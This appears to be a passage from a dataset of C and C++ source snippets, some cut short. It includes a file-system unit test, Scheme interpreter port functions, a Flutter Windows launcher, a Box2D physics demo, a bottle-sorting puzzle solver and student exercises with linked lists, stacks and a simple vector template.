Return(0)));\n  ASSERT_EQ(0, lfs->Init(option));\n}\n\n// test Statfs\nTEST_F(Ext4LocalFileSystemTest, StatfsTest) {\n  FileSystemInfo fsinfo;\n  EXPECT_CALL(*wrapper, statfs(NotNull(), NotNull())).WillOnce(Return(0));\n  ASSERT_EQ(lfs->Statfs(\"./\", &fsinfo), 0);\n  EXPECT_CALL(*wrapper, statfs(NotNull(), NotNull())).WillOnce(Return(-1));\n  ASSERT_EQ(lfs->Statfs(\"./\", &fsinfo), -errno);\n}\n\n// test Open\nTEST_F(Ext4LocalFileSystemTest, OpenTest) {\n  EXPECT_CALL(*wrapper, open(NotNull(), _, _)).WillOnce(Return(666));\n  ASSERT_EQ(lfs->Open(\"/a\", 0), 666);\n  EXPECT_CALL(*wrapper, open(NotNull(), _, _)).WillOnce(Return(-1));\n  ASSERT_EQ(lfs->Open(\"/a\", 0), -errno);\n}\n\n// test Close\nTEST_F(Ext4LocalFileSystemTest, CloseTest) {\n  EXPECT_CALL(*wrapper, close(_)).WillOnce(Return(0));\n  ASSERT_EQ(lfs->Close(666), 0);\n  EXPECT_CALL(*wrapper, close(_)).WillOnce(Return(-1));\n  ASSERT_EQ(lfs->Close(666), -errno);\n}\n\n// test Delete\nTEST_F(Ext4LocalFileSystemTest, DeleteTest) {\n  // fake env\n  {\n    struct stat dirInfo;\n    dirInfo.st_mode = S_IFDIR;\n    struct stat fileInfo;\n    fileInfo.st_mode = S_IFREG;\n    // /a is a file\n    EXPECT_CALL(*wrapper, stat(StrEq(\"/a\"), NotNull()))\n        .WillRepeatedly(DoAll(SetArgPointee<1>(fileInfo), Return(0)));\n    // /b is a di",
    "#include <io.h>\n\n\nobject* make_input_port(FILE* in) {\n    object* temp=NULL;\n\n    temp=new_object();\n    temp->type=INPUT_PORT;\n    temp->data.input_port.stream=in;\n    return temp;\n}\n\nobject* make_output_port(FILE* out) {\n    object* temp=NULL;\n\n    temp=new_object();\n    temp->type=OUTPUT_PORT;\n    temp->data.output_port.stream=out;\n    return temp;\n}\n\nobject* load_procedure(object* args) {\n    char *file=NULL;\n    FILE *in=NULL;\n    object* exp;\n\n    file=car(args)->data.string.value;\n    in=fopen(file,\"r\");\n    if (in==NULL) {\n        return make_warn(\"Exception in Load: Cannot load the file\");\n    }\n\n    while( (exp=read(in))!=NULL ) {\n        eval(exp,global_environment);\n        printf(\"\\n\");\n    }\n    fclose(in);\n    return ok_symbol;\n}\n\nobject* read_procedure(object* args) {\n    return args;\n}\n\nobject* open_input_port_procedure(object* args) {\n    char *file=NULL;\n    FILE *in=NULL;\n\n\n    file=car(args)->data.string.value;\n    in=fopen(file,\"r\");\n    if (in==NULL) {\n        return make_warn(\"Exception in open input port: Cannot open input port\");\n    }\n    return make_input_port(in);\n}\n\nobject* close_input_port_procedure(object* args) {\n    char res;\n\n    res=fclose(car(args)->data.input_port.stream);\n    if ( res==EOF ) {\n        return make_warn(\"Exception in close input port: Cannot close input port\");\n    }\n    return ok_symbol;\n}\n\nobject* open_output_port_procedure(object* args) {\n    char *file=NULL;\n    FILE *out=NULL;\n\n\n    file=car(args)->data.string.value;\n    out=fopen(file,\"w\");\n    if (out==NULL) {\n        return make_warn(\"Exception in open input port: Cannot open input port\");\n    }\n    return make_output_port(out);\n}\n\nobject* close_output_port_procedure(object* args) {\n    char res;\n\n    res=fclose(car(args)->data.output_port.stream);\n    if ( res==EOF ) {\n        return make_warn(\"Exception in close input port: Cannot close input port\");\n    }\n    return ok_symbol;\n}    \n\nobject* is_input_port_procedure(object* args) {\n    return is_input_port(car(args))?True:False;\n}\n\nobject* is_output_port_procedure(object* args) {\n    return is_output_port(car(args))?True:False;\n}",
    "#include <flutter/dart_project.h>\r\n#include <flutter/flutter_view_controller.h>\r\n#include <windows.h>\r\n\r\n#include \"flutter_window.h\"\r\n#include \"utils.h\"\r\n\r\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\r\n                      _In_ wchar_t *command_line, _In_ int show_command) {\r\n  // Attach to console when present (e.g., 'flutter run') or create a\r\n  // new console when running with a debugger.\r\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\r\n    CreateAndAttachConsole();\r\n  }\r\n\r\n  // Initialize COM, so that it is available for use in the library and/or\r\n  // plugins.\r\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\r\n\r\n  flutter::DartProject project(L\"data\");\r\n\r\n  std::vector<std::string> command_line_arguments =\r\n      GetCommandLineArguments();\r\n\r\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\r\n\r\n  FlutterWindow window(project);\r\n  Win32Window::Point origin(10, 10);\r\n  Win32Window::Size size(1280, 720);\r\n  if (!window.Create(L\"task_manager\", origin, size)) {\r\n    return EXIT_FAILURE;\r\n  }\r\n  window.SetQuitOnClose(true);\r\n\r\n  ::MSG msg;\r\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\r\n    ::TranslateMessage(&msg);\r\n    ::DispatchMessage(&msg);\r\n  }\r\n\r\n  ::CoUninitialize();\r\n  return EXIT_SUCCESS;\r\n}\r\n",
    "// MIT License\n\n// Copyright (c) 2019 Erin Catto\n\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n// of this software and associated documentation files (the \"Software\"), to deal\n// in the Software without restriction, including without limitation the rights\n// to use, copy, modify, merge, publish, distribute, sublicense, and/or sell\n// copies of the Software, and to permit persons to whom the Software is\n// furnished to do so, subject to the following conditions:\n\n// The above copyright notice and this permission notice shall be included in all\n// copies or substantial portions of the Software.\n\n// THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n// IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n// FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n// AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n// LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n// OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE\n// SOFTWARE.\n\n#include \"test.h\"\n\nclass BodyTypes : public Test\n{\npublic:\n\tBodyTypes()\n\t{\n\t\tb2Body* ground = NULL;\n\t\t{\n\t\t\tb2BodyDef bd;\n\t\t\tground = m_world->CreateBody(&bd);\n\n\t\t\tb2EdgeShape shape;\n\t\t\tshape.SetTwoSided(b2Vec2(-20.0f, 0.0f), b2Vec2(20.0f, 0.0f));\n\n\t\t\tb2FixtureDef fd;\n\t\t\tfd.shape = &shape;\n\n\t\t\tground->CreateFixture(&fd);\n\t\t}\n\n\t\t// Define attachment\n\t\t{\n\t\t\tb2BodyDef bd;\n\t\t\tbd.type = b2_dynamicBody;\n\t\t\tbd.position.Set(0.0f, 3.0f);\n\t\t\tm_attachment = m_world->CreateBody(&bd);\n\n\t\t\tb2PolygonShape shape;\n\t\t\tshape.SetAsBox(0.5f, 2.0f);\n\t\t\tm_attachment->CreateFixture(&shape, 2.0f);\n\t\t}\n\n\t\t// Define platform\n\t\t{\n\t\t\tb2BodyDef bd;\n\t\t\tbd.type = b2_dynamicBody;\n\t\t\tbd.position.Set(-4.0f, 5.0f);\n\t\t\tm_platform = m_world->CreateBody(&bd);\n\n\t\t\tb2PolygonShape shape;\n\t\t\tshape.SetAsBox(0.5f, 4.0f, b2Vec2(4.0f, 0.0f), 0.5f * b2_pi);\n\n\t\t\tb2FixtureDef fd;\n\t\t\tfd.shape = &shape;\n\t\t\tfd.friction = 0.6f;\n\t\t\tfd.density = 2.0f;\n\t\t\tm_platform->CreateFixture(&fd);\n\n\t\t\tb2RevoluteJointDef rjd;\n\t\t\trjd.Initialize(m_attachment, m_platform, b2Vec2(0.0f, 5.0f));\n\t\t\trjd.maxMotorTorque = 50.0f;\n\t\t\trjd.enableMotor = true;\n\t\t\tm_world->CreateJoint(&rjd);\n\n\t\t\tb2PrismaticJointDef pjd;\n\t\t\tpjd.Initialize(ground, m_platform, b2Vec2(0.0f, 5.0f), b2Vec2(1.0f, 0.0f));\n\n\t\t\tpjd.maxMotorForce = 1000.0f;\n\t\t\tpjd.enableMotor = true;\n\t\t\tpjd.lowerTranslation = -10.0f;\n\t\t\tpjd.upperTranslation = 10.0f;\n\t\t\tpjd.enableLimit = true;\n\n\t\t\tm_world->CreateJoint(&pjd);\n\n\t\t\tm_speed = 3.0f;\n\t\t}\n\n\t\t// Create a payload\n\t\t{\n\t\t\tb2BodyDef bd;\n\t\t\tbd.type = b2_dynamicBody;\n\t\t\tbd.position.Set(0.0f, 8.0f);\n\t\t\tb2Body* body = m_world->CreateBody(&bd);\n\n\t\t\tb2PolygonShape shape;\n\t\t\tshape.SetAsBox(0.75f, 0.75f);\n\n\t\t\tb2FixtureDef fd;\n\t\t\tfd.shape = &shape;\n\t\t\tfd.friction = 0.6f;\n\t\t\tfd.density = 2.0f;\n\n\t\t\tbody->CreateFixture(&fd);\n\t\t}\n\t}\n\n\tvoid Keyboard(int key) override\n\t{\n\t\tswitch (key)\n\t\t{\n\t\tcase GLFW_KEY_D:\n\t\t\tm_platform->SetType(b2_dynamicBody);\n\t\t\tbreak;\n\n\t\tcase GLFW_KEY_S:\n\t\t\tm_platform->SetType(b2_staticBody);\n\t\t\tbreak;\n\n\t\tcase GLFW_KEY_K:\n\t\t\tm_platform->SetType(b2_kinematicBody);\n\t\t\tm_platform->SetLinearVelocity(b2Vec2(-m_speed, 0.0f));\n\t\t\tm_platform->SetAngularVelocity(0.0f);\n\t\t\tbreak;\n\t\t}\n\t}\n\n\tvoid Step(Settings& settings) override\n\t{\n\t\t// Drive the kinematic body.\n\t\tif (m_platform->GetType() == b2_kinematicBody)\n\t\t{\n\t\t\tb2Vec2 p = m_platform->GetTransform().p;\n\t\t\tb2Vec2 v = m_platform->GetLinearVelocity();\n\n\t\t\tif ((p.x < -10.0f && v.x < 0.0f) ||\n\t\t\t\t(p.x > 10.0f && v.x > 0.0f))\n\t\t\t{\n\t\t\t\tv.x = -v.x;\n\t\t\t\tm_platform->SetLinearVelocity(v);\n\t\t\t}\n\t\t}\n\n\t\tTest::Step(settings);\n\n\t\tg_debugDraw.DrawString(5, m_textLine, \"Keys: (d) dynamic, (s) static, (k) kinematic\");\n\t\tm_textLine += m_textIncrement;\n\t}\n\n\tstatic Test* Create()\n\t{\n\t\treturn new BodyTypes;\n\t}\n\n\tb2Body* m_attachment;\n\tb2Body* m_platform;\n\tfloat m_speed;\n};\n\nstatic int testIndex = RegisterTest(\"Examples\", \"Body Types\", BodyTypes::Create);\n",
    "#include <iostream>\r\n#include <vector>\r\n#include <string>\r\n#include <algorithm>\r\n#include <map>\r\n\r\nclass BottleStack {\r\nprivate:\r\n\tint bottleNumber;\r\n\tint maxSize;\r\n\tstd::vector<short> stackVec;\r\n\tvoid constructor(int size) {\r\n\t\tif (size < 1) {\r\n\t\t\tstd::cout << \"invalidSize\\n\";\r\n\t\t}\r\n\t\tmaxSize = size;\r\n\t\tstackVec.reserve(size);\r\n\t}\r\n\tvoid popBack(){\r\n\t\tif (isEmpty()) {\r\n\t\t\tstd::cout << \"trying to pop empty array in popBack()\\n\";\r\n\t\t\treturn;\r\n\t\t}\r\n\t\tstackVec.pop_back();\r\n\t\treturn;\r\n\t}\r\n\tvoid insert(short value) {\r\n\t\tstackVec.push_back(value);\r\n\t\treturn;\r\n\t}\r\n\tvoid insertVector(std::vector<short>& baseVector) {\r\n\t\t//stackVec = std::move(baseVector);\r\n\t\tstackVec.swap(baseVector);\r\n\t}\r\n\tshort getTop()const {\r\n\t\tif (isEmpty()) {\r\n\t\t\tstd::cout << \"getTop access empty array\\n\";\r\n\t\t\treturn -1;\r\n\t\t}\r\n\t\treturn stackVec.back();\r\n\t}\r\npublic:\r\n\tbool isFull()const {\r\n\t\treturn stackVec.size() == maxSize;\r\n\t}\r\n\tbool isEmpty()const {\r\n\t\treturn stackVec.size() == 0;\r\n\t}\r\n\tBottleStack(int num) {\r\n\t\tconstructor(4);\r\n\t\tbottleNumber = num;\r\n\t}\r\n\tBottleStack(int num, int size) {\r\n\t\tconstructor(size);\r\n\t\tbottleNumber = num;\r\n\t}\r\n\tBottleStack(int num, int size,std::vector<short> baseVector) {\r\n\t\tconstructor(size);\r\n\t\tinsertVector(baseVector);\r\n\t\tbottleNumber = num;\r\n\t}\r\n\tint getSize()const {\r\n\t\treturn stackVec.size();\r\n\t}\r\n\tint getMaxSize()const {\r\n\t\treturn maxSize;\r\n\t}\r\n\tint getBottleNumber()const {\r\n\t\treturn bottleNumber;\r\n\t}\r\n\tshort getValue(int index) const{\r\n\t\tif (index >= getSize()) {\r\n\t\t\tstd::cout << \"invalidIndex\\n\";\r\n\t\t\treturn 0xFFFF;\r\n\t\t}\r\n\t\treturn stackVec.at(index);\r\n\t}\r\n\tbool transfer(BottleStack& receiver) {\r\n\t\tif (isEmpty() || receiver.isFull()) {\r\n\t\t\treturn false;\r\n\t\t}\r\n\t\tshort topValue = getTop();\r\n\t\tif (receiver.isEmpty()) {\r\n\t\t\tpopBack();\r\n\t\t\treceiver.insert(topValue);\r\n\t\t\treturn true;\r\n\t\t}\r\n\t\telse if (getTop() != receiver.getTop()) {\r\n\t\t\treturn false;\r\n\t\t}\r\n\t\tpopBack();\r\n\t\treceiver.insert(topValue);\r\n\t\treturn true;\r\n\t}\r\n\tvoid deTransfer(BottleStack& receiver) {\r\n\t\tif (isFull() || receiver.isEmpty()) {\r\n\t\t\tstd::cout << \"deTransfer error\\n\";\r\n\t\t\treturn;\r\n\t\t}\r\n\t\tshort topValue = receiver.getTop();\r\n\t\treceiver.popBack();\r\n\t\tinsert(topValue);\r\n\t\treturn;\r\n\t}\r\n\tbool isSingular() {\r\n\t\tif (isEmpty()) {\r\n\t\t\treturn true;\r\n\t\t}\r\n\t\tint testValue = stackVec.at(0);\r\n\t\tint size = stackVec.size();\r\n\t\tfor (int i = 1; i < size; i++) {\r\n\t\t\tif (testValue != stackVec.at(i)) {\r\n\t\t\t\treturn false;\r\n\t\t\t}\r\n\t\t}\r\n\t\treturn true;\r\n\t}\r\n\tbool operator<(const BottleStack& other) const {\r\n\t\treturn stackVec < other.stackVec;\r\n\t}\r\n\tbool operator>(const BottleStack& other) const {\r\n\t\treturn stackVec > other.stackVec;\r\n\t}\r\n\tbool operator==(const BottleStack& other) const {\r\n\t\treturn stackVec == other.stackVec;\r\n\t}\r\n\tvoid printBottle() {\r\n\t\tfor (auto& value : stackVec) {\r\n\t\t\tstd::cout << value << ' ';\r\n\t\t}\r\n\t\tstd::cout << \"|\\n\";\r\n\t}\r\n};\r\n\r\n\r\nstd::map<std::vector<BottleStack>, int> lookUpMap;\r\nint saveNum = 0;\r\n\r\nstd::vector<std::pair<int, int>> findColorSortSolution(\r\n\tstd::vector<BottleStack> bottleStackVec,\r\n\tstd::vector<std::pair<int, int>> solutionTail){\r\n\r\n\t//sort to lessen the number of bottle combination thus lessen the amount of recursive call needed\r\n\tstd::sort(bottleStackVec.begin(), bottleStackVec.end());\r\n\tif (lookUpMap.find(bottleStackVec) != lookUpMap.end()) {\r\n\t\t//if the transfer result to the solution that already exist\r\n\t\t//return empty vector to avoid infinite loop and optimize\r\n\t\treturn {};\r\n\t}\r\n\t//if transfer doesn't exist save the transfers result\r\n\tlookUpMap[bottleStackVec] = saveNum++;\r\n\r\n\tbool correct = true;\r\n\tfor (int i = 0; i < bottleStackVec.size();i++) {\r\n\t\tauto& bottle = bottleStackVec[i];\r\n\t\tif ((bottle.isSingular()&&bottle.isFull()) || bottle.isEmpty()) {\r\n\t\t\tcontinue;\r\n\t\t}\r\n\t\t//if atleast one bottle is wrong continue backtracking\r\n\t\tcorrect = false;\r\n\t\tfor (int j = 0; j < bottleStackVec.size();j++) {\r\n\t\t\tif (i == j) continue; //skip transferring to itself\r\n\t\t\tif (bottle.transfer(bottleStackVec[j])) {\r\n\t\t\t\tint count=0;\r\n\t\t\t\twhile (bottle.transfer(bottleStackVec[j]))count++;//multiple transfers\r\n\t\t\t\t//record the transfer\r\n\t\t\t\tstd::vector<std::pair<int, int>> newVec = solutionTail;\r\n\t\t\t\tnewVec.push_back({ bottle.getBottleNumber(), bottleStackVec[j].getBottleNumber() });\r\n\t\t\t\t//print out the current state of transferred bottle\r\n\t\t\t\tfor (auto& bottleStackVec : bottleStackVec) {\r\n\t\t\t\t\tbottleStackVec.printBottle();\r\n\t\t\t\t}\r\n\t\t\t\tstd::cout << \"---------------------\\n\";\r\n\t\t\t\t// Recurse to find the solution of this transfer\r\n\t\t\t\tstd::vector<std::pair<int, int>> result = findColorSortSolution(bottleStackVec, newVec);\r\n\t\t\t\t// found solution would be returned and it would not be empty\r\n\t\t\t\tif (!result.empty()) {\r\n\t\t\t\t\t//return found solution\r\n\t\t\t\t\treturn result;\r\n\t\t\t\t}\r\n\t\t\t\t//reverse the transfer\r\n\t\t\t\tbottle.deTransfer(bottleStackVec[j]);\r\n\t\t\t\t//reverse multiple transfers\r\n\t\t\t\twhile (count--)bottle.deTransfer(bottleStackVec[j]);\r\n\t\t\t}\r\n\t\t}\r\n\t}\r\n\r\n\t//return found solution\r\n\tif (correct) {\r\n\t\treturn solutionTail;\r\n\t}\r\n\r\n\t//no solution f",
    "#include \"Student.h\"\n#include \"Node.h\"\n\n#include <iostream>\n#include <cstring>\n\n//Main code for LinkedList2\n//Created by Tai Wong, Jan 2nd.\n\n\nusing namespace LinkedList;\nusing namespace std;\n\n//function prototypes\nvoid addStudent(Node* &head);\nvoid insertStudent(Node* &head, Student* student);\nvoid printStudent(Node* head);\nvoid deleteStudent(Node* &head, int id);\nvoid averageGPA(Node* head, float &count, int &sCount);\n\n//maim\nint main() {\n  //creates head outside of loop for continuity\n  Node* head = NULL;\n   \n  while (true) {\n    //asks for command\n    cout << \"What command?\" << endl;\n    char response[10];\n    cin >> response;\n    //compares response and gives the corresponding action\n    if (strcmp(response, \"ADD\") == 0) {\n      addStudent(head);\n    } else if (strcmp(response, \"PRINT\") == 0) {\n      printStudent(head);\n    } else if (strcmp(response, \"DELETE\") == 0) {\n      cout << \"What is the ID of the student?\" << endl;\n      int deleteID;\n      cin >> deleteID;\n      deleteStudent(head, deleteID);\n    } else if (strcmp(response, \"QUIT\") == 0) {\n      return 0;\n    } else if (strcmp(response, \"AVERAGE\") == 0) {\n      float count = 0.0;\n      int sCount = 0;\n      averageGPA(head, count, sCount);\n      float roundedGPA = roundf((count / 2) * 100) / 100;\n\n      cout << \"Average GPA is \" << roundedGPA << endl;\n      \n    }\n  }\n}\n\n//add student function\nvoid addStudent(Node* &head) {\n  cout << \"First Name?\" << endl;\n  char fName[80];\n  cin >> fName;\n\n  cout << \"Last Name?\" << endl;\n  char lName[80];\n  cin >> lName;\n\n  cout << \"ID#?\" << endl;\n  int idNum;\n  cin >> idNum;\n\n  cout << \"GPA?\" << endl;\n  float GPA;\n  cin >> GPA;\n  //inserts student into linked list recursively\n  Student* newStudent = new Student(fName, lName, idNum, GPA);\n  insertStudent(head, newStudent);\n}\n\nvoid insertStudent(Node* &head, Student* student) {\n  //inserts based on ID number, least to greatest\n  if (head == NULL || student->getID() < head->getStudent()->getID()) {\n    Node* newNode = new Node(student);\n    newNode->setNext(head);\n    head = newNode;\n  } else {\n    Node* &nextNode = head->getNext();\n    insertStudent(nextNode, student);\n  }\n}\n\n//prints student recursively\nvoid printStudent(Node* head) {\n  if (head == NULL) {\n    cout << \"No Students Added\" << endl;\n  } else {\n    Student* cStudent = head->getStudent();\n    float roundedGPA = roundf(cStudent->getGPA() * 100) / 100;\n    cout << cStudent->getFirstName() << ' ' << cStudent->getLastName() << \", \" << cStudent->getID() << \", \" << roundedGPA << endl;\n\n    if (head->getNext() != NULL) {\n      printStudent(head->getNext());\n    }\n  }\n}\n\n//deletes student recursively\nvoid deleteStudent(Node* &head, int id) {\n  if (head == NULL) {\n    cout << \"No Students in List\" << endl;\n    return;\n  }\n\n  if (head->getStudent()->getID() == id) {\n    Node* temp = head;\n    head = head->getNext();\n    delete temp;\n    return;\n  }\n  deleteStudent(head->getNext(), id);\n}\n\n//averages gpa of students recursively\nvoid averageGPA(Node* head, float &count, int &sCount) {\n  if (head == NULL) {\n    cout << \"No Students Added\" << endl;\n  } else {\n    Student* cStudent = head->getStudent();\n    float roundedGPA = roundf(cStudent->getGPA() * 100) / 100;\n    count += roundedGPA;\n    sCount += 1;\n    if (head->getNext() != NULL) {\n      averageGPA(head->getNext(), count, sCount);\n    }\n  }\n}\n",
    "#include <iostream>\n#include <string>\nusing namespace std;\n\n// Define the structure for a CD\nstruct CD {\n    string album_title;   // Album title\n    string artist;        // Artist name\n    int number_of_tracks; // Number of tracks in the album\n    CD* nextCD;           // Pointer to the next CD in the stack\n};\n\n// Global pointer to the top of the stack\nCD* head = nullptr;\n\n// Push function to add a CD to the stack\nvoid push() {\n    // Create a new CD node dynamically\n    CD* newCD = new CD;\n    cout << \"Enter album title: \";\n    cin.ignore(); // Ignore leftover newline character from previous input\n    getline(cin, newCD->album_title);\n\n    cout << \"Enter artist name: \";\n    getline(cin, newCD->artist);\n\n    cout << \"Enter number of tracks: \";\n    cin >> newCD->number_of_tracks;\n\n    // Add the new CD to the top of the stack\n    newCD->nextCD = head; // Point to the current top CD\n    head = newCD;         // Update head to the new CD\n\n    cout << \"CD added successfully.\\n\";\n}\n\n// Pop function to remove a CD from the stack\nvoid pop() {\n    if (head == nullptr) { // Check if the stack is empty\n        cout << \"Stack is empty. No CD to remove.\\n\";\n        return;\n    }\n\n    // Remove the top CD from the stack\n    CD* temp = head;        // Save the current top CD\n    head = head->nextCD;    // Move the head to the next CD\n    cout << \"CD '\" << temp->album_title << \"' by \" << temp->artist << \" removed.\\n\";\n    delete temp;            // Free the memory of the removed CD\n}\n\n// Display function to show all CDs in the stack\nvoid display() {\n    if (head == nullptr) { // Check if the stack is empty\n        cout << \"The stack is empty.\\n\";\n        return;\n    }\n\n    cout << \"CD Stack:\\n\";\n    CD* temp = head; // Start from the top of the stack\n    while (temp != nullptr) {\n        cout << \"Album Title: \" << temp->album_title << \", Artist: \" << temp->artist\n             << \", Number of Tracks: \" << temp->number_of_tracks << \"\\n\";\n        temp = temp->nextCD; // Move to the next CD\n    }\n}\n\n// Main program\nint main() {\n    int choice; // Variable to store user's menu choice\n\n    do {\n        cout << \"\\nMenu:\\n\";\n        cout << \"1. Push (Add CD)\\n\";\n        cout << \"2. Pop (Remove CD)\\n\";\n        cout << \"3. Display CDs\\n\";\n        cout << \"4. Quit\\n\";\n        cout << \"Enter your choice: \";\n        cin >> choice;\n\n        switch (choice) {\n        case 1:\n            push();\n            break;\n        case 2:\n            pop();\n            break;\n        case 3:\n            display();\n            break;\n        case 4:\n            cout << \"Exiting program...\\n\";\n            break;\n        default:\n            cout << \"Invalid choice. Please try again.\\n\";\n        }\n    } while (choice != 4); // Exit when the user selects option 4\n\n    return 0; // Program ends\n}\n",
    "\ufeff#define _CRTDBG_MAP_ALLOC\n#include <stdlib.h>\n#include <crtdbg.h>\n#include <iostream>\n#include <vector>\n#include <string>\n#include <algorithm>\n\nusing namespace std;\n\ntemplate <typename T>   // \ud074\ub798\uc2a4 \ud15c\ud50c\ub9bf \uc0ac\uc6a9\nclass SimpleVector {\nprivate:\n    T* data;            // \uac1d\uccb4 \uc0dd\uc131\uc2dc \uc785\ub825\ub41c \uac12\uc758 \uc790\ub8cc\ud615\uc5d0 \ub9de\ucd94\uc5b4 \uc0dd\uc131\ub428\n    int currentSize;    // \ud604\uc7ac \ubc30\uc5f4\uc5d0 \ud560\ub2f9\ub41c \uc6d0\uc18c\uc758 \uac1c\uc218\n    int currentCapacity;// \ud604\uc7ac \ubc30\uc5f4\uc758 \ud06c\uae30\n    void resize(int newCapacity) {      // \ubc30\uc5f4\uc758 \ud06c\uae30\ub97c \uc7ac\uc870\uc815\ud558\ub294 \uba54\uc11c\ub4dc\n        if (currentCapacity >= newCapacity) cout << \"\uc785\ub825\ub41c \ud06c\uae30\uac00 \ud604\uc7ac \ud06c\uae30\ubcf4\ub2e4 \uc791\uc2b5\ub2c8\ub2e4.\" << endl;\n        else {\n            T* newData = new T[newCapacity];        // \uc785\ub825\ubc1b\uc740 \ud06c\uae30\ub9cc\ud07c\uc758 \ubc30\uc5f4\uc744 \uc0dd\uc131\ud55c\ub2e4\n            for (int i = 0; i < currentSize; i++) {\n                newData[i] = data[i];               // \uc6d0\ubcf8\uc758 \uac12\uc744 \ub300\uc785\ud55c\ub2e4\n            }\n            delete[] data;                          // \uc6d0\ubcf8\uc744 \ud574\uc9c0\ud558\uace0\n            data = newData;                         // \uc0c8 \ubc30\uc5f4\uc744 \ud3ec\uc778\ud130\uc5d0 \ud560\ub2f9\ud55c\ub2e4\n            currentCapacity = newCapacity;\n        }\n    }\n\npublic:\n    // \uc785\ub825\ubc1b\uc740 \uac12\uc774 \uc5c6\uc744 \ub54c\uc758 \uc0dd\uc131\uc790\n    SimpleVector() : currentSize(0), currentCapacity(10) {\n        data = new T[10];   // \ud15c\ud50c\ub9bf\uc744 \ud1b5\ud574 \uc785\ub825\ubc1b\uc740 \uc790\ub8cc\ud615\uc758 \uac1d\uccb4\ub97c \uc0dd\uc131\ud55c\ub2e4.\n        cout << \"\uc6a9\ub7c9\uc774 10\uc778 \ubc30\uc5f4\uc774 \uc0dd\uc131\ub418\uc5c8\uc2b5\ub2c8\ub2e4.\" << endl;\n    }\n    // \ubc30\uc5f4\uc758 \ud06c\uae30\ub97c \uc785\ub825 \ubc1b\uc744 \uacbd\uc6b0\uc758 \uc0dd\uc131\uc790\n    SimpleVector(int capacity) {\n        currentCapacity = capacity;\n        currentSize = 0;\n        data = new T[capacity]; // \ud15c\ud50c\ub9bf\uc744 \ud1b5\ud574 \uc785\ub825\ubc1b\uc740 \uc790\ub8cc\ud615\uc758 \uac1d\uccb4\ub97c \uc0dd\uc131\ud55c\ub2e4.\n    }\n    // \ubcf5\uc0ac \uc0dd\uc131\uc790\n    SimpleVector(const SimpleVector& others) {\n        this->currentSize = others.currentSize;\n        this->currentCapacity = others.currentCapacity;\n        this->data = new T[this->currentCapacity];\n        for (int i = 0; i < this->currentSize; i++) {\n            this->data[i] = others.data[i];             // \uc624\ubc84\ub7f0\uc774 \ubc1c\uc0dd\ud574\uc11c this->\ub97c \uc0ac\uc6a9\ud574\ubcf4\ub2c8 \uc0ac\ub77c\uc84c\uc2b5\ub2c8\ub2e4.\n        }\n    }\n    // \uc18c\uba78\uc790\n    ~SimpleVector() {\n        delete[] data;          // \ud504\ub85c\uadf8\ub7a8\uc774 \uc885\ub8cc\ub420 \ub54c data \uac1d\uccb4\ub3c4 \ud568\uaed8 \uc81c\uac70\ud55c\ub2e4. (\uadf8\ub7ec\ub098 \ubcf4\uc774\ub4dc \ud3ec\uc778\ud130\uc5d0\uc11c\ub294 \uc791\ub3d9\ub418\uc9c0 \uc54a\ub294\uac83 \uac19\ub2e4.)\n    }\n    void push_back(const T& x) {                // \ud15c\ud50c\ub9bf\uc744 \ud1b5\ud574 \uc785\ub825\ubc1b\uc740 \uc790\ub8cc\ud615\uc758 \uac12\uc744 \ubc30\uc5f4\uc5d0 \ub123\ub294\ub2e4.\n        if (currentSize >= currentCapacity) {\n            resize(currentCapacity + 5);        // resize\ub97c \ud1b5\ud574 \uac04\uc18c\ud654\n        }\n        data[currentSize] = x;\n        cout << \"\uc785\ub825\ubc1b\uc740 \" << x << \"\uc744 \ub9e8 \ub4a4\uc5d0 \ucd94\uac00\ud569\ub2c8\ub2e4\" << endl;\n        currentSize++;\n        cout << \"\uc6d0\uc18c\uc758 \uac1c\uc218\ub294 \" << currentSize << \"\uac00 \ub418\uc5c8\uc2b5\ub2c8\ub2e4.\" << endl << endl;\n    }\n    void pop_back() {                           // \uc6d0\uc18c\uc758 \uac1c\uc218\ub97c \uc904\uc778\ub2e4.\n        if (currentSize > 0) {\n            currentSize--;\n            cout << \"\uc6d0\uc18c\uc758 \uac1c\uc218\uac00 \" << currentSize << \"\ub85c \uc904\uc5b4\ub4e4\uc5c8\uc2b5\ub2c8\ub2e4.\" << endl << endl;\n        }\n        else cout << \"\uc774\ubbf8 \uc6d0\uc18c\uc758 \uac1c\uc218\ub294 0 \uc785\ub2c8\ub2e4.\" << endl << endl;\n    }\n    int size() {                // currentSize\ub97c \ubc18\ud658\ud55c\ub2e4.\n        return currentSize;\n    }\n    int capacity() {            // currentCapacity\ub97c \ubc18\ud658\ud55c\ub2e4.\n        return currentCapacity;\n    }\n    T getData(int num) {        // data\uc5d0 \uc800\uc7a5\ub41c \uac12\uc744 \ubc18\ud658\ud55c\ub2e4.\n        return data[num];\n    }\n    // \ubc30\uc5f4\uc744 \uc815\ub82c\n    void sortData() {\n        sort(data, data + currentSize); // sort \ud568\uc218\ub97c \uadf8\ub300\ub85c \uc0ac\uc6a9\ud588\uc2b5\ub2c8\ub2e4.\n        cout << \"\ubc30\uc5f4\uc758 \uc815\ub82c\uc774 \uc644\ub8cc\ub418\uc5c8\uc2b5\ub2c8\ub2e4.\" << endl << endl;\n    }\n\n};\n\nint main() {\n    _CrtSetDbgFlag(_CRTDBG_ALLOC_MEM_DF | _CRTDBG_LEAK_CHECK_DF);\n    int capacity = 0;       // \uc785\ub825\ubc1b\uc744 \ubc30\uc5f4\uc758 \ud06c\uae30\n    while (capacity < 1) {\n        cout << \"\ub9cc\ub4e4\uace0\uc790\ud558\ub294 \ubc30\uc5f4\uc758 \ud06c\uae30\ub97c \uc785\ub825\ud574 \uc8fc\uc138\uc694.\" << endl;\n        cin >> 